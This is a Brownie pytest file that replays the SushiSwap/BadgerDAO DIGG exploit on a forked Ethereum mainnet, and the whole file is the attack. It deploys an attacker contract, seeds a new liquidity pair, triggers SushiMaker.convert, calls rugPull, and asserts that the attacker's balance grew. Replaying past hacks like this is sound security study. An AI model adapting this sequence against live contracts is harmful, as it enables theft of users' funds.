import pytest
from brownie import accounts

from setup_fixtures import brownie_project, eth_fork_network

#https://cmichel.io/replaying-ethereum-hacks-sushiswap-badger-dao-digg/

@pytest.mark.fork_blocknumber(11720049)
def test_hack(eth_fork_network, brownie_project):
    sushi_factory = brownie_project.interface.IUniswapV2Factory('0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac')
    sushi_maker = brownie_project.interface.ISushiMaker('0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50')

    weth = brownie_project.interface.IWETH('0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2')

    digg_wbtc_pair = brownie_project.interface.IUniswapV2Pair('0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3')

    attacker_eoa = accounts[0]
    attacker_start_balance = attacker_eoa.balance()
    sushi_router_addr = '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F'
    attacker_contract = brownie_project.BadgerDaoAttacker.deploy(
        sushi_router_addr,
        sushi_factory.address,
        {'from': attacker_eoa})

    wbtc_addr = digg_wbtc_pair.token0()
    digg_addr = digg_wbtc_pair.token1()

    attacker_contract.createAndProvideLiquidity(
        wbtc_addr,
        digg_addr,
        {'from': attacker_eoa, 'value': eth_fork_network.web3.toWei(0.001, 'Ether')})

    digg_weth_pair_addr = sushi_factory.getPair(weth.address, digg_addr)
    digg_weth_pair = brownie_project.interface.IUniswapV2Pair(digg_weth_pair_addr)

    reserve_digg, reserve_eth, _ = digg_weth_pair.getReserves()

    lp_balance_attacker_contract = digg_weth_pair.balanceOf(attacker_contract.address)
    print(f'reserves: {reserve_eth/10**18} ETH, {reserve_digg/10**18}')
    assert lp_balance_attacker_contract > 0

    sushi_maker.convert(wbtc_addr, digg_addr, {'from': attacker_eoa.address})

    attacker_contract.rugPull(digg_weth_pair.address, wbtc_addr)

    attacker_end_balance = attacker_eoa.balance()

    assert attacker_end_balance > attacker_start_balance